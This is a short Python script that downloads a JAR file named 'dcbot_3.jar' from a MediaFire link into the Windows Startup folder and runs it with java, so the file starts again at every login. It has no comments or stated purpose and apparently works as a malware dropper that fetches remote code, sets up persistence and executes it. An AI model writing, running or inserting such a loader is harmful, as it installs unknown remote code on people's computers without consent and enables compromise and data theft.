import urllib.request
import subprocess
import os




url = "https://www.mediafire.com/file/9frt7p6z242t7q4/dcbot_3.jar"
filename = "dcbot_3.jar"
startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
filepath = os.path.join(startup_path, filename)
response = urllib.request.urlopen(url)
with open(filepath, 'wb') as out_file:
    data = response.read()
    out_file.write(data)
subprocess.call(["java", "-jar", filepath], cwd=startup_path)

